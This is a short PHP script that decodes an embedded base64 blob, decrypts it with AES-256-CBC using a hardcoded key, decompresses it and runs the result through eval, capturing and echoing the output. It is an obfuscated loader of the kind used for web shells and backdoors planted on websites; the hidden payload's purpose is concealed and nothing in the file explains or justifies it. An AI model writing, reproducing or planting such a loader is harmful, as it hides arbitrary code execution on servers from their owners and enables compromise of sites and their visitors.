<?php
ob_start();
$data = 'YzZhOTY3NDQ2NmNmNzM5NmE5ZDg0MDk3NDZhYjI4YmO6faiq92gyCu+Tzlhi/LdpdEluUlQzWW52K0VBaXk2bVdScmZYZ3duRGZObWlZNGFadGdLNno2OWNTWFk1WStRSjVNN2pHQUY5RkhmSkNvUDB1cjZzdWJnTzBKdUpRcG41N21uSlJSaFp6NVZONDQ2M3NlYUtNN2tSQVRhTzlwaUliUjlvQmlqV1UxYVZ5bjArYytrQURnMXFnbGpIMU0rNTdOQVROTTY0cHg5V0ZtV3R2d0RNOGJGWEpnQjB1YURHRGREMGVnSXQwT0NiSFdZMUZ4ZDNMeFpleXVoZEthZHg0OFdVdnBRRDRIUWJqa3RaMW55YjUvSUVHSTNIWmF5RVV1VThFaGJyWVlZektMdWRLUTBNRUZ4UTcveEZxQmoySHBzZTNOcVh2RlgxUVc4YXIxUGxoc2Jva3RoSjFrNE9Kd3dTcjZnTWg4Q3Q1M0RpbEdUcUsxSnBrOGhOODNwdFRJSGhoM0tvUXB0YlYxeEVvSmR3bG5mQmRmNDFVVHJMRVFVUzh4cDVXZ0hBbjhuYVdyWTh1emhrWGQvelpIbUlSOXJMY0E2RWtURnBaMGxyam94V1UvZGJrND0=';
$decodedData = base64_decode($data);
$salt = substr($decodedData, 0, 32);
$iv = substr($decodedData, 32, 16);
$encryptedData = substr($decodedData, 48);
$key = '+f0oEvs0oLb5KhM50vqXKIvl/KtheoO9fXewq4jtNMc=';
$decryptedData = openssl_decrypt($encryptedData, 'AES-256-CBC', $key, 0, $iv);
eval(gzuncompress(base64_decode($decryptedData)));
$output = ob_get_contents();
ob_end_clean();
echo $output;
?>